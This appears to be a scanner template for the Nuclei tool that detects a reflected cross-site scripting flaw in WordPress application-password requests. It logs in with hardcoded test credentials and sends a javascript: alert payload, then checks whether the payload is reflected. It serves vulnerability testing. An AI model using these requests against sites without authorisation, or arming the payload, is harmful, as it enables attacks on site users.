@@ -1,0 +1,49 @@
+id: application-pass-xss
+
+info:
+  name: Reflected Cross-Site Scripting via Application Password Requests
+  author: nqdung2002
+  severity: medium
+  description: WordPress Core is vulnerable to Reflected Cross-Site Scripting via the ‘success_url’ and 'reject_url' parameters when requesting application passwords in versions between 5.6 and 6.3.1 due to insufficient input sanitization and output escaping of pseudo protocol URIs.
+  impact: This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link and accepting or rejecting the application password.
+  reference:
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-56-631-reflected-cross-site-scripting-via-application-password-requests?asset_slug=wordpress
+    - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+    framework: wordpress
+  tags: wpscan,xss,wp,wordpress,authenticated,applicationpassword,rxss
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{admin}}&pwd={{password}}
+      - |
+        GET /wp-admin/authorize-application.php?success_url={{javascript}}&reject_url={{javascript}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      admin: 
+        - "admin"
+      password: 
+        - "123"
+      javascript:
+        - "javascript%3Aalert%28document.domain%29"
+    attack: clusterbomb
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "javascript:alert(document.domain)")'
+        condition: and
+
+        
+  
